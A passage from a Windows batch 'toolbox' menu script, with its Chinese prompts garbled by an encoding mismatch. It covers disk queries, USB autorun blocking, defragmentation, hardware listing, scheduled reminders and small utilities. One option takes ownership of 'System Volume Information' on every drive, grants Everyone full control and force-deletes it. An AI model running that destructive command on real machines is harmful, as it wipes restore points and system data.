echo _______________________________________________________________________________
echo �����������&pause>nul
goto 24
:24(4)
title ��ѯNTFS����Ϣ%system%
cls
echo _______________________________________________________________________________
fsutil fsinfo drives
echo _______________________________________________________________________________
set ntfsjxx=
set/p ntfsjxx=������Ҫ��ѯ��������:
cls
fsutil fsinfo ntfsinfo %ntfsjxx%:
echo _______________________________________________________________________________
echo �����������&pause>nul
goto 24
:24(5)
title ��ѯREFS����Ϣ%system%
cls
echo _______________________________________________________________________________
fsutil fsinfo drives
echo _______________________________________________________________________________
set ntfsjxx=
set/p ntfsjxx=������Ҫ��ѯ��������:
cls
fsutil fsinfo refsinfo %ntfsjxx%:
echo _______________________________________________________________________________
echo �����������&pause>nul
goto 24
:24(6)
title ��ѯ������Ϣ%system%
cls
echo _______________________________________________________________________________
fsutil fsinfo drives
echo _______________________________________________________________________________
set ntfsjxx=
set/p ntfsjxx=������Ҫ��ѯ��������:
cls
fsutil fsinfo sectorinfo %ntfsjxx%:
echo _______________________________________________________________________________
echo �����������&pause>nul
goto 24
:25
title ����ָ����С���ļ�%system%
cls
echo ����ָ����С���ļ�(e=����)
echo _______________________________________________________________________________
set cjlj=
set/p cjlj=�������ļ�·��:
set cjlj="%cjlj:|=%"
if /i !cjlj!=="e" goto memuv2
set cjdx=
set/p cjdx=�������ļ���С(��λ:�ֽ�):
set cjdx="%cjdx:|=%"
if /i !cjdx!=="e" goto memuv2
:24(6)
fsutil file createnew %cjlj% %cjdx%
echo _______________________________________________________________________________
echo �����������&pause>nul
goto 25
:26
title ����U�̲���%system%
cls
echo �˹������U�̽������ߣ�����autorun���͵Ĳ����Զ�����
echo _______________________________________________________________________________
echo [1]����U������
echo [2]ȡ��U������
echo [0]���ز˵�
echo _______________________________________________________________________________
choice /c 120 /n /m ���������ѡ��:
if "%errorlevel%" equ "1" goto 26(1)
if "%errorlevel%" equ "2" goto 26(2)
if "%errorlevel%" equ "3" goto memuv2
goto 26
set upanmy=
set/p upanmy=���������ѡ��:
set upanmy="%upanmy:|=%"
if !upanmy!=="1" goto 26(1)
if !upanmy!=="2" goto 26(2)
if !upanmy!=="0" goto memuv2
echo ��������ȷ��ѡ�
ping/n 2 0.0>nul
goto 26
:26(1)
title ����U������%system%
cls
echo �����������ƶ�����...
for /f "delims=" %%a in ('"fsutil fsinfo drives"') do (set sypf=%%a)
set sypf=%sypf:~5%
for %%l in (%sypf%) do (
fsutil fsinfo drivetype %%l|find /i "���ƶ�������"&&goto 26-3)
cls
echo û���ҵ����ƶ�����
echo _______________________________________________________________________________
echo �����������&pause>nul
goto 26
:26-3
cls
for /f "delims=" %%a in ('"fsutil fsinfo drives"') do (set sypf=%%a)
set sypf=%sypf:~5%
for %%l in (%sypf%) do (
fsutil fsinfo drivetype %%l|find /i "���ƶ�������"&&takeown/f %%lautorun.inf
fsutil fsinfo drivetype %%l|find /i "���ƶ�������"&&echo y|cacls %%lautorun.inf /t /c /p everyone:f
fsutil fsinfo drivetype %%l|find /i "���ƶ�������"&&attrib -s -h -r %%lautorun.inf
fsutil fsinfo drivetype %%l|find /i "���ƶ�������"&&del/f/q %%lautorun.inf
fsutil fsinfo drivetype %%l|find /i "���ƶ�������"&&rd/s/q %%lautorun.inf
fsutil fsinfo drivetype %%l|find /i "���ƶ�������"&&md %%lautorun.inf
fsutil fsinfo drivetype %%l|find /i "���ƶ�������"&&md "%%lautorun.inf\�����ļ��У�����ɾ��"
fsutil fsinfo drivetype %%l|find /i "���ƶ�������"&&md "%%lautorun.inf\�����ļ��У�����ɾ�� / "
fsutil fsinfo drivetype %%l|find /i "���ƶ�������"&&echo y|cacls %%lautorun.inf /t /c /p everyone:r) 2>nul
echo;
echo _______________________________________________________________________________
echo U���������
echo �����������&pause>nul
goto 26
:26(2)
title ȡ��U������%system%
cls
echo �����������ƶ�����...
for /f "delims=" %%a in ('"fsutil fsinfo drives"') do (set sypf=%%a)
set sypf=%sypf:~5%
for %%m in (%sypf%) do (
fsutil fsinfo drivetype %%m|find /i "���ƶ�������"&&goto 26-4)
cls
echo û���ҵ����ƶ�����
echo _______________________________________________________________________________
echo �����������&pause>nul
goto 26
:26-4
cls
for /f "delims=" %%a in ('"fsutil fsinfo drives"') do (set sypf=%%a)
set sypf=%sypf:~5%
for %%m in (%sypf%) do (
fsutil fsinfo drivetype %%m|find /i "���ƶ�������"&&takeown/f %%mautorun.inf
fsutil fsinfo drivetype %%m|find /i "���ƶ�������"&&echo y|cacls %%mautorun.inf /t /c /p everyone:f
fsutil fsinfo drivetype %%m|find /i "���ƶ�������"&&attrib -s -h -r %%mautorun.inf
fsutil fsinfo drivetype %%m|find /i "���ƶ�������"&&del/f/q %%mautorun.inf
fsutil fsinfo drivetype %%m|find /i "���ƶ�������"&&rd/s/q %%mautorun.inf) 2>nul
echo _______________________________________________________________________________
echo ȡ��U���������
echo �����������&pause>nul
goto 26
:27
title ������Ƭ����%system%
cls
echo _______________________________________________________________________________
echo [1]�������д���
echo [0]���ز˵�
echo _______________________________________________________________________________
fsutil fsinfo drives
echo _______________________________________________________________________________
set fenxi=
set/p fenxi=��������Ҫ�������̷�:
set fenxi="%fenxi:|=%"
if !fenxi!=="1" goto 27(1)
if !fenxi!=="0" goto memuv2
:27(4)
cls
defrag/a %fenxi%:
echo _______________________________________________________________________________
:27(3)
set zhengli=
set/p zhengli=�Ƿ�ʼ������Ƭ����(y/n):
set zhengli="%zhengli:|=%"
if /i !zhengli!=="y" goto 27(2)
if /i !zhengli!=="n" goto 27
echo ��������ȷ��ѡ�
ping/n 2 0.0>nul
goto 27(3)
:27(1)
cls
for /f "delims=" %%a in ('"fsutil fsinfo drives"') do (set sypf=%%a)
set sypf=%sypf:~5%
if /i "%system:~18,2%"=="XP" for %%n in (%sypf%) do defrag/v/x %%n
for %%n in (%sypf%) do defrag/u/v/x %%n
echo _______________________________________________________________________________
echo �����������&pause>nul
goto 27
:27(2)
cls
defrag/u/v/x %fenxi%:||defrag/v/x %fenxi%:
echo _______________________________________________________________________________
echo �����������&pause>nul
goto 27
:28
title һ��ɾ�����ļ���%system%
cls
echo ���Everything�İ�װ·��������״̬...
set flag=
set flag1=rem
for /f "delims=" %%a in ('"reg query "HKEY_LOCAL_MACHINE\SOFTWARE\voidtools\Everything" /v InstallLocation|find "InstallLocation""') do (set EverythingInstallPath=%%a)
if "%system:~8,2%"=="XP" (set EverythingInstallPath=%EverythingInstallPath:~27%) else (set EverythingInstallPath=%EverythingInstallPath:~33%)
if exist "%EverythingInstallPath%\Everything.exe" (tasklist /fi "status eq running" /fi "username eq "%username%"" /fi "imagename eq everything.exe"|find /i "Everything.exe"&&if exist "%EverythingInstallPath%\es.exe" set flag=rem&set flag1=)
cls
echo ע��:�����ϵͳ�̽��в������ܻᱻɱ���������
echo _______________________________________________________________________________
fsutil fsinfo drives
echo _______________________________________________________________________________
set caozuo=
set/p caozuo=��������Ҫ�������̷���·��:
if not defined caozuo goto 28
set caozuo|findstr /i "\<[a-z]\>">nul
if "%errorlevel%" neq "0" goto 28-1
cls
echo �����������ļ���...     �ļ�Խ������ʱ��Խ��
%flag% for /f "delims=" %%o in ('"dir/a/s/b/ad-l %caozuo%:|sort/r"') do rd/q "%%o"2>nul&&echo ��ɾ�����ļ���%%o
rem %flag1% for /f "delims=" %%o in ('""%EverythingInstallPath%\es.exe" -sort path-descending /ad-l %caozuo%:"') do rd/q "%%o"2>nul&&echo ��ɾ�����ļ���%%o
:loop1
%flag1% set empty=0
%flag1% for /f "delims=" %%o in ('""%EverythingInstallPath%\es.exe" %caozuo%: empty: ^!attrib:l"') do (
	rd /q "%%o"&&if !errorlevel! equ 0 (
		set empty=1
		��ɾ�����ļ���%%o
	)
)
timeout /t 2 /nobreak>nul
%flag1% if "%empty%"=="1" goto loop1
goto 28(2)
:28-1
dir /ad "!caozuo!">nul 2>nul||echo ·�� !caozuo! ����һ���ļ���&&timeout /t 2 /nobreak>nul&&goto 28
echo �����������ļ���...     �ļ�Խ������ʱ��Խ��
if "%caozuo:~0,1%%caozuo:~-1%" neq """" for /f "delims=" %%a in ('"echo %caozuo%"') do (set %caozuo%="%%~a")
%flag% for /f "delims=" %%o in ('"dir/a/s/b/ad-l %caozuo%|sort/r"') do rd/q "%%o"2>nul&&echo ��ɾ�����ļ���%%o
rem %flag1% for /f "delims=" %%o in ('""%EverythingInstallPath%\es.exe" -sort path-descending /ad-l %caozuo%"') do rd/q "%%o"2>nul&&echo ��ɾ�����ļ���%%o
:loop2
%flag1% set empty=0
%flag1% for /f "delims=" %%o in ('""%EverythingInstallPath%\es.exe" %caozuo% empty: ^!attrib:l"') do (
	rd /q "%%o"&&if !errorlevel! equ 0 (
		set empty=1
		echo;��ɾ�����ļ���%%o
	)
)
timeout /t 2 /nobreak>nul
%flag1% if "%empty%"=="1" goto loop2
:28(2)
echo _______________________________________________________________________________
echo ���ļ���ɾ�����
echo ����������ز˵�&pause>nul
goto memuv2
:29
title ping���������ӳ�%system%
cls
set ping=
set pingcishu=
if exist %systemroot%\system32\curl.exe (ping /n 1 www.baidu.com>nul&if !errorlevel! equ 0 (rem set /p =����IPV4��ַ: <nul
rem curl 4.ipw.cn
rem curl ipv4.ip.sb
curl https://myip.ipip.net
set /p =<nul
echo;))
if exist %systemroot%\system32\curl.exe (ping /n 1 240c::6666>nul&if !errorlevel! equ 0 (set /p =����IPV6��ַ: <nul
curl 6.ipw.cn
::curl ipv6.ip.sb
echo;))
echo;
set/p ping=������Ŀ��IP������ַ:
set/p pingcishu=������ping����:
echo;
echo ���ڲ���%ping%�������ӳ�...
ping/n %pingcishu% %ping% /a
echo _______________________________________________________________________________
echo ����������ز˵�&pause>nul
goto memuv2
:30
title Ӳ�����%system%
cls
set systemstarttime=
for /f "skip=2 tokens=2 delims==" %%a in ('Wmic OS Get LastBootUpTime /value') do (
    set systemstarttime=%%a
    echo;ϵͳ����ʱ��:	!systemstarttime:~0,4!��!systemstarttime:~4,2!��!systemstarttime:~6,2!�� !systemstarttime:~8,2!:!systemstarttime:~10,2!:!systemstarttime:~12,2!
    echo;
)
set systeminstalltime=
for /f "skip=2 tokens=2 delims==" %%a in ('Wmic OS Get InstallDate /value') do (
    set systeminstalltime=%%a
    echo;ϵͳ��װ����:	!systeminstalltime:~0,4!��!systeminstalltime:~4,2!��!systeminstalltime:~6,2!�� !systeminstalltime:~8,2!:!systeminstalltime:~10,2!:!systeminstalltime:~12,2!
    echo;
)
for /f "delims== tokens=2" %%a in ('"wmic cpu get name/value"') do set cpu=%%a
echo CPU: 		%cpu%
echo;
for /f "delims== tokens=2" %%a in ('"wmic cpu get processorid/value"') do set cpuid=%%a
echo CPU ID: 	%cpuid%
echo;
for /f "delims== tokens=2" %%a in ('"wmic cpu get numberofcores/value"') do set cpuhx=%%a
for /f "delims== tokens=2" %%a in ('"wmic cpu get numberOflogicalprocessors/value"') do set cpuxc=%%a
echo 		%cpuhx%����%cpuxc%�߳�
echo;
for /f "delims== tokens=2" %%a in ('"wmic cpu get currentclockspeed/value"') do set cpuzp=%%aMHz
echo ��Ƶ: 		%cpuzp%
echo;
for /f "delims== tokens=2" %%a in ('"wmic cpu get datawidth/value"') do set cpuws=%%abit
echo ���ݿ��: 	%cpuws%
echo;
for /f "delims== tokens=2" %%a in ('"wmic cpu get extclock/value"') do set cpuwp=%%aMHz
echo ��Ƶ: 		%cpuwp%
echo;
set ch=
for /f "skip= 2 tokens=2 delims==" %%a in ('"wmic path win32_cachememory get maxcachesize/value"') do (
    set /a "ch+=1"
    if !ch! equ 1 (
        set /a cpul1=%%a
    ) else (
        if !ch! equ 2 (
            set /a cpul2=%%a
        ) else (
            if !ch! equ 3 (
                set /a cpul3=%%a
            ) else (
                if !ch! equ 4 (
                    set /a cpul4=%%a
                )
            )
        )
    )
)
echo;һ������:	!cpul1! KB
echo;
call :xdwjs !cpul2! kb dw
echo;��������:	!dw!
echo;
if "!cpul3!" neq "" (
    call :xdwjs !cpul3! kb dw
    echo;��������:	!dw!
    echo;
) else (
    echo;��������:	0
    echo;
)
if "!cpul4!" neq "" (
    call :xdwjs !cpul4! kb dw
    echo;�ļ�����:	!dw!
    echo;
) else (
    echo;�ļ�����:	0
    echo;
)
rem for /f "delims== tokens=2" %%a in ('"wmic cpu get l2cachesize/value"') do set cpul2=%%a
rem set cpul2|findstr "\<[0-9]*\>">nul
rem if "%errorlevel%" equ "0" call :dwjs %cpul2% 1
rem echo ��������: 	%size% %dw%
rem echo;
rem for /f "delims== tokens=2" %%a in ('"wmic cpu get l3cachesize/value"') do set cpul3=%%a
rem set cpul3|findstr "\<[0-9]*\>">nul
rem if "%errorlevel%" equ "0" call :dwjs %cpul3% 1
rem echo ��������: 	%size% %dw%)
echo _______________________________________________________________________________
set zhuban=,zhubanxh=
for /f "delims== tokens=2" %%a in ('"wmic baseboard get manufacturer/value"') do set zhuban=%%a
echo ����������: 	%zhuban%
echo;
for /f "delims== tokens=2" %%a in ('"wmic baseboard get product/value"') do set zhubanxh=%%a
echo �����ͺ�: 	%zhubanxh%
echo;
set zbuuid=
for /f "skip=2 tokens=2 delims==" %%a in ('Wmic Csproduct Get Uuid /Value') do (
    echo;����UUID:	%%a
    echo;
)
set bioszzs=,biosbb=,bioszzrq
for /f "delims== tokens=2" %%a in ('"wmic bios get manufacturer/value"') do set bioszzs=%%a
echo BIOS������: 	%bioszzs%
echo;
for /f "delims== tokens=2" %%a in ('"wmic bios get smbiosbiosversion/value"') do set biosbb=%%a
echo BIOS�汾: 	%biosbb%
echo;
for /f "delims== tokens=2" %%a in ('"wmic bios get releasedate/value"') do set bioszzrq=%%a
echo BIOS��������: 	%bioszzrq:~0,4%��%bioszzrq:~4,2%��%bioszzrq:~6,2%��
echo _______________________________________________________________________________
set xsqxh=,xsqzzs=,fbl1=,fbl2=
for /f "delims== tokens=2" %%a in ('"wmic desktopmonitor get name/value"') do set xsqxh=%%a
echo ��ʾ���ͺ�: 	%xsqxh%
echo;
for /f "delims== tokens=2" %%a in ('"wmic desktopmonitor get monitormanufacturer/value"') do set xsqzzs=%%a
echo ��ʾ��������: 	%xsqzzs%
echo;
for /f "delims== tokens=2" %%a in ('"wmic path win32_videocontroller get currenthorizontalresolution/value"') do set fbl1=%%a
for /f "delims== tokens=2" %%a in ('"wmic path win32_videocontroller get currentverticalresolution/value"') do set fbl2=%%a
echo �ֱ���: 	%fbl1% x %fbl2%
echo _______________________________________________________________________________
set xkxc=,xsms=,sxl=,qdrq=,qdbb=
set /p =�Կ�: 		<nul&for /f "delims=" %%a in ('"wmic path win32_videocontroller get name|find /i /v "name""') do echo %%a|find /i /v "echo"
for /f "delims== tokens=2" %%a in ('"wmic path win32_videocontroller get adapterram/value"') do set xkxc=%%a
call :xdwjs %xkxc% b dw
echo;
echo �Դ�����: 	%dw%
echo;
for /f "delims== tokens=2" %%a in ('"wmic path win32_videocontroller get videomodedescription/value"') do set xsms=%%a
echo ��ǰ��ʾģʽ: 	%xsms%
echo;
for /f "delims== tokens=2" %%a in ('"wmic path win32_videocontroller get currentrefreshrate/value"') do set sxl=%%aHz
echo ��ǰˢ����: 	%sxl%
echo;
for /f "delims== tokens=2" %%a in ('"wmic path win32_videocontroller get driverdate/value"') do set qdrq=%%a
echo ��������: 	%qdrq:~0,4%��%qdrq:~4,2%��%qdrq:~6,2%��
echo;
for /f "delims== tokens=2" %%a in ('"wmic path win32_videocontroller get driverversion/value"') do set qdbb=%%a
echo �����汾: 	%qdbb%
echo _______________________________________________________________________________
echo Ӳ���ͺ�:
for /f "delims=" %%a in ('"wmic diskdrive get model|find /i /v "model""') do echo %%a|find /i /v "echo"
echo;
echo �ӿ�����:
for /f "delims=" %%a in ('"wmic diskdrive get interfacetype|find /i /v "interfacetype""') do echo %%a|find /i /v "echo"
echo;
echo Ӳ������:
for /f "delims=" %%a in ('"wmic diskdrive get size|find /i /v "size""') do (call :xdwjs %%a b dw
if "!dw!" neq "0" echo !dw!)
echo;
echo ��������:
for /f "delims=" %%a in ('"wmic diskdrive get totalsectors|find /i /v "totalsectors""') do echo %%a|find /i /v "echo"
echo;
echo ������:
for /f "delims=" %%a in ('"wmic diskdrive get partitions|find /i /v "partitions""') do echo %%a|find /i /v "echo"
fsutil fsinfo drives
wmic logicaldisk get name,volumename,description,filesystem,size,freespace
echo _______________________________________________________________________________
echo ��ӡ��������:
for /f "delims== tokens=2" %%a in ('"Wmic Printer where "Default^='TRUE'" get caption /value"') do (echo %%a)
echo;
echo ��ӡ���ͺ�:
for /f "delims== tokens=2" %%a in ('"Wmic Printer where "Default^='TRUE'" get drivername /value"') do (echo %%a)
echo;
echo ����:
for /f "delims=" %%a in ('"wmic sounddev get name|find /i /v "name""') do echo %%a|find /i /v "echo"
echo;
echo ����:
for /f "delims== tokens=2" %%a in ('"Wmic Path Win32_NetworkAdapterConfiguration WHERE "IPEnabled^='TRUE'" get description /value"') do (echo %%a)
echo;
set netspeed=
for /f "skip=2 tokens=2 delims==" %%a in ('Wmic path Win32_PerfFormattedData_Tcpip_NetworkInterface get CurrentBandwidth /value') do (
    set netspeed=%%a
    set /a "netspeed=netspeed/1000000"
    echo;��ǰ���������ٶ�:      !netspeed! Mbps
    echo;
)
echo ���ص�ַ:
for /f "delims== tokens=2" %%a in ('"Wmic Path Win32_NetworkAdapterConfiguration WHERE "IPEnabled^='TRUE'" get defaultipgateway /value"') do (set mrwg=%%a
set mrwg=!mrwg:~0,-1!
if "!mrwg!" equ "" goto mrwgtc
set mrwg=!mrwg:{=!
set mrwg=!mrwg:}=!
set mrwg=!mrwg:"=!
set mrwg=!mrwg:,=	!
echo !mrwg!)
:mrwgtc
echo;
echo IP:
if exist %systemroot%\system32\curl.exe (ping /n 1 www.baidu.com>nul&&curl 4.ipw.cn) else (for /f "skip=12 tokens=4 delims=: " %%a in ('"netsh interface Teredo show state"') do (echo %%a))
echo;
for /f "delims== tokens=2" %%a in ('"Wmic Path Win32_NetworkAdapterConfiguration WHERE "IPEnabled^='TRUE'" get ipaddress /value"') do (set ipdz=%%a
set ipdz=!ipdz:{=!
set ipdz=!ipdz:}=!
set ipdz=!ipdz:"=!
set ipdz=!ipdz:,=	!
echo !ipdz!)
echo;
echo MAC:
for /f "delims== tokens=2" %%a in ('"Wmic Path Win32_NetworkAdapterConfiguration WHERE "IPEnabled^='TRUE'" get macaddress /value"') do (set macdz=%%a
set macdz=!macdz:{=!
set macdz=!macdz:}=!
set macdz=!macdz:"=!
echo !macdz!)
echo _______________________________________________________________________________
echo �ڴ�����:
for /f "delims== tokens=2" %%a in ('"wmic memorychip get capacity /value"') do (call :xdwjs %%a b dw
if "!dw!" neq "0" echo !dw!)
echo �ڴ�Ƶ��:
for /f "delims== tokens=2" %%a in ('"wmic memorychip get speed /value"') do (set ncpl=%%a
echo !ncpl:~0,-1! MHz)
systeminfo|find /i "�ڴ�"
echo _______________________________________________________________________________
mode
echo _______________________________________________________________________________
echo ����������ز˵�&pause>nul
goto memuv2
:31
title ������%system%
cls
echo ��һ������0��С��128����(������128)
echo _______________________________________________________________________________
pause
cls
:d0c
for /l %%a in (1,2,127) do set/p=%%a   <nul
echo;
choice /c YN /n /m �������������������?(Y=��,N=û��)[1\7]
if "%errorlevel%" equ "1" set /a num=1
if "%errorlevel%" equ "2" set /a num=0
set a=2
set b=3
cls
:d1c
for /l %%a in (%a%,1,%b%) do (set/p=%%a   <nul
set/a a=a+2
set/a b=b+2)
if %b% lss 128 goto d1c
echo;
choice /c YN /n /m �������������������?(Y=��,N=û��)[2\7]
if "%errorlevel%" equ "1" set /a num=num+2
if "%errorlevel%" equ "2" set /a num=num
set c=4
set d=7
cls
:d2c
for /l %%a in (%c%,1,%d%) do (set/p=%%a   <nul
set/a c=c+2
set/a d=d+2)
if %d% lss 128 goto d2c
echo;
choice /c YN /n /m �������������������?(Y=��,N=û��)[3\7]
if "%errorlevel%" equ "1" set /a num=num+4
if "%errorlevel%" equ "2" set /a num=num
set e=8
set f=15
cls
:d3c
for /l %%a in (%e%,1,%f%) do (set/p=%%a   <nul
set/a e=e+2
set/a f=f+2)
if %f% lss 128 goto d3c
echo;
choice /c YN /n /m �������������������?(Y=��,N=û��)[4\7]
if "%errorlevel%" equ "1" set /a num=num+8
if "%errorlevel%" equ "2" set /a num=num
set g=16
set h=31
cls
:d4c
for /l %%a in (%g%,1,%h%) do (set/p=%%a   <nul
set/a g=g+2
set/a h=h+2)
if %g% lss 128 goto d4c
echo;
choice /c YN /n /m �������������������?(Y=��,N=û��)[5\7]
if "%errorlevel%" equ "1" set /a num=num+16
if "%errorlevel%" equ "2" set /a num=num
set i=32
set j=63
cls
:d5c
for /l %%a in (%i%,1,%j%) do (set/p=%%a   <nul
set/a i=i+2
set/a j=j+2)
if %j% lss 128 goto d5c
echo;
choice /c YN /n /m �������������������?(Y=��,N=û��)[6\7]
if "%errorlevel%" equ "1" set /a num=num+32
if "%errorlevel%" equ "2" set /a num=num
set k=64
set l=127
cls
:d6c
for /l %%a in (%k%,1,%l%) do (set/p=%%a   <nul
set/a k=k+2
set/a l=l+2)
if %l% lss 128 goto d6c
echo;
choice /c YN /n /m �������������������?(Y=��,N=û��)[7\7]
if "%errorlevel%" equ "1" set /a num=num+64
if "%errorlevel%" equ "2" set /a num=num
cls
echo �������Ը��ӵļ����,�ó������������Ǹ�����:!cswz!41;92m %num% !cswz!!ysbak!
echo _______________________________________________________________________________
echo ����������ز˵�&pause>nul
goto memuv2
:32
title DOS����%system%
cls
echo _______________________________________________________________________________
echo [1]��ʱ����ָ������
echo [2]��ʱ����ָ���ļ�
echo [3]��ʾ���еļƻ�����
echo [4]ɾ���ƻ�����
echo [0]���ز˵�
echo _______________________________________________________________________________
set nzxx=
set/p nzxx=���������ѡ��:
set nzxx="%nzxx:|=%"
if !nzxx!=="1" goto 32(1)
if !nzxx!=="2" goto 32(2)
if !nzxx!=="3" goto 32(3)
if !nzxx!=="4" goto 32(4)
if !nzxx!=="0" goto memuv2
echo ��������ȷ��ѡ�
ping/n 2 0.0>nul
goto 32
:32(1)
title ��ʱ����ָ������%system%
cls
set txnrmc=
set/p txnrmc=��ָ����������:
echo _______________________________________________________________________________
set txnr=
set/p txnr=����������Ҫ���ѵ�����:
echo _______________________________________________________________________________
set txnrrq=
set/p txnrrq=��������������(��ʽ: yyyy/mm/dd ����2015/08/05):
echo _______________________________________________________________________________
set txnrsj=
set/p txnrsj=����������ʱ��(��ʽ: hh:mm:ss ����09:03:05):
cls
md %systemdrive%\DOS��������ʱĿ¼>nul 2>nul
echo ���ļ�����DOS���������ʱ�ļ���,ɾ�����޷��������е����ݣ�>%systemdrive%\DOS��������ʱĿ¼\˵��.txt
echo @echo off>"%systemdrive%\DOS��������ʱĿ¼\%txnrmc% - ��ʱ�����ļ�.bat"
echo title %txnrmc%>>"%systemdrive%\DOS��������ʱĿ¼\%txnrmc% - ��ʱ�����ļ�.bat"
echo color f1>>"%systemdrive%\DOS��������ʱĿ¼\%txnrmc% - ��ʱ�����ļ�.bat"
echo echo >>"%systemdrive%\DOS��������ʱĿ¼\%txnrmc% - ��ʱ�����ļ�.bat"
echo cls>>"%systemdrive%\DOS��������ʱĿ¼\%txnrmc% - ��ʱ�����ļ�.bat"
echo echo ��������:"%txnr%">>"%systemdrive%\DOS��������ʱĿ¼\%txnrmc% - ��ʱ�����ļ�.bat"
echo echo _______________________________________________________________________________>>"%systemdrive%\DOS��������ʱĿ¼\%txnrmc% - ��ʱ�����ļ�.bat"
echo echo ���ļ���DOS������ - ��ʱ����ָ�����ݹ�������>>"%systemdrive%\DOS��������ʱĿ¼\%txnrmc% - ��ʱ�����ļ�.bat"
echo echo ����ʱ��:%date:~0,4%��%date:~5,2%��%date:~8,2%�� %xingqi% %time:~0,8%>>"%systemdrive%\DOS��������ʱĿ¼\%txnrmc% - ��ʱ�����ļ�.bat"
echo echo _______________________________________________________________________________>>"%systemdrive%\DOS��������ʱĿ¼\%txnrmc% - ��ʱ�����ļ�.bat"
echo echo ��������˳�^&pause^>nul>>"%systemdrive%\DOS��������ʱĿ¼\%txnrmc% - ��ʱ�����ļ�.bat"
schtasks /create /tn "%txnrmc%" /tr "%systemdrive%\DOS��������ʱĿ¼\%txnrmc% - ��ʱ�����ļ�.bat" /st %txnrsj% /sd %txnrrq% /sc once&&echo ������%txnrrq% %txnrsj%����
echo �����ļ��ѱ�����"%systemdrive%\DOS��������ʱĿ¼\%txnrmc% - ��ʱ�����ļ�.bat"
echo _______________________________________________________________________________
echo ����������ز˵�&pause>nul
goto 32
:32(2)
title ��ʱ����ָ���ļ�%system%
cls
set dsyxmc=
set/p dsyxmc=��ָ����������:
echo _______________________________________________________________________________
set dsyxlj=
set/p dsyxlj=���϶���Ҫ��ʱ���е��ļ����˴���:
if "%dsyxlj:~0,1%%dsyxlj:~-1%" neq """" for /f "delims=" %%a in ('"echo %dsyxlj%"') do (set %dsyxlj%="%%~a")
echo _______________________________________________________________________________
set dsyxrq=
set/p dsyxrq=��������������(��ʽ: yyyy/mm/dd ����2015/08/05):
echo _______________________________________________________________________________
set dsyxsj=
set/p dsyxsj=����������ʱ��(��ʽ: hh:mm:ss ����09:03:05):
cls
md %systemdrive%\DOS��������ʱĿ¼>nul 2>nul
echo ���ļ�����DOS���������ʱ�ļ���,ɾ�����޷��������е����ݣ�>%systemdrive%\DOS��������ʱĿ¼\˵��.txt
echo "%dsyxlj%">"%systemdrive%\DOS��������ʱĿ¼\%dsyxmc% - ��ʱ�����ļ�.bat"
schtasks /create /tn "%dsyxmc%" /tr "%systemdrive%\DOS��������ʱĿ¼\%dsyxmc% - ��ʱ�����ļ�.bat" /st %dsyxsj% /sd %dsyxrq% /sc once&&echo ������%dsyxrq% %dsyxsj%����
echo �����ļ��ѱ�����"%systemdrive%\DOS��������ʱĿ¼\%dsyxmc% - ��ʱ�����ļ�.bat"
echo _______________________________________________________________________________
echo ����������ز˵�&pause>nul
goto 32
:32(3)
title ��ʾ���еļƻ�����%system%
cls
schtasks /query
echo _______________________________________________________________________________
echo ����������ز˵�&pause>nul
goto 32
:32(4)
title ɾ���ƻ�����%system%
cls
schtasks /query
echo _______________________________________________________________________________
set rwsc=
set/p rwsc=������Ҫɾ������������:
cls
schtasks /delete /tn "%rwsc%" /f
del/f/q "%systemdrive%\DOS��������ʱĿ¼\%rwsc% - ��ʱ�����ļ�.bat"2>nul
del/f/q "%systemdrive%\DOS��������ʱĿ¼\%rwsc% - ��ʱ�����ļ�.bat"2>nul
dir/a/s %systemdrive%\DOS��������ʱĿ¼\*.bat>nul 2>nul||rd/s/q %systemdrive%\DOS��������ʱĿ¼
echo _______________________________________________________________________________
echo ����������ز˵�&pause>nul
goto 32
:33
title ��ʱ��%system%
cls
echo ��ʱ����ȷ��0.01��
echo _______________________________________________________________________________
echo ���������ʼ��ʱ(����������ʱ)&pause>nul
set kssjbk=%time%
cls
echo ��ʱ���ѿ�ʼ��ʱ,�������ֹͣ��ʱ.&pause>nul
set jssjbk=%time%
call :sjc "%kssjbk%" "%jssjbk%"
cls
echo ��ʱ��ʼʱ��:%kssjbk%
echo ��ʱ����ʱ��:%jssjbk%
echo _______________________________________________________________________________
echo ��ʱ:%sjc:~0,2%ʱ%sjc:~2,2%��%sjc:~4,2%.%sjc:~6,2%��
echo ����������ز˵�&pause>nul
goto memuv2
:34
title �������������%system%
cls
set mmws=
set mmxz=
set mmjg=
set mmjs=aA0bB1cC2dD3eE4fF5gG6hH7iI8jJ9kK0lL1mM2nN3oO4pP5qQ6rR7sS8tT9uU0vV1wW2xX3yY4zZ5
set/p mmws=���������ɵ�����λ��:
:34(1)
cls
for /l %%a in (1,1,%mmws%) do (set/a mmxz=!random!%%63
for %%b in (!mmxz!) do set mmjg=!mmjg!!mmjs:~%%b,1!)
echo �����ɵ��������:
echo %mmjg%
echo _______________________________________________________________________________
echo ����������ز˵�&pause>nul
goto memuv2
:35
title ɾ��ÿ���̷��µ�System Volume Information�ļ���%system%
cls
echo ���������ʼɾ��System Volume Information�ļ���&pause>nul
cls
for /f "delims=" %%a in ('"fsutil fsinfo drives"') do (set sypf=%%a)
set sypf=%sypf:~5%
for %%a in (%sypf%) do (
takeown/f "%%aSystem Volume Information" 2>nul
echo y|cacls "%%aSystem Volume Information" /t /c /p everyone:f 2>nul
rd/s/q "%%aSystem Volume Information"2>nul)
echo;
echo _______________________________________________________________________________
echo ɾ�����
echo ����������ز˵�&pause>nul
goto memuv2
:36
title ������ת����%system%
set shijinzhi=
set erjinzhi=
set shilioujinzhi=
set shijinzhibak=
set shijinzhibak2=
set shijinzhibak3=
set bajinzhi=
cls
echo ���֧��2147483647��ʮ����ת��
echo _______________________________________________________________________________
echo [1]����ʮ����ת��
echo [2]���������ת��
echo [0]���ز˵�
echo _______________________________________________________________________________
choice /c 120 /n /m ���������ѡ��:
if "%errorlevel%" equ "1" goto 10z
if "%errorlevel%" equ "2" goto 2z
if "%errorlevel%" equ "3" goto memuv2
goto 36
set zhxz=
set/p zhxz=���������ѡ��:
set zhxz="%zhxz:|=%"
if !zhxz!=="1" goto 10z
if !zhxz!=="2" goto 2z
if !zhxz!=="0" goto memuv2
echo ��������ȷ��ѡ��!
ping/n 2 0.0>nul
goto 36
:10z
cls
set shijinzhi=
set/p shijinzhi=������ʮ��������:
for /f "delims=0123456789" %%a in ('echo %shijinzhi%') do goto shijinzhicw
set shijinzhibak=%shijinzhi%
set shijinzhibak2=%shijinzhibak%
set shijinzhibak3=%shijinzhibak2%
:36(1)
set/a e=shijinzhi%%2
set/a shijinzhi=shijinzhi/2
set erjinzhi=%e%%erjinzhi%
if %shijinzhi% neq 0 goto 36(1)
:36(2)
set/a b=%shijinzhibak%%%8
set/a shijinzhibak=%shijinzhibak%/8
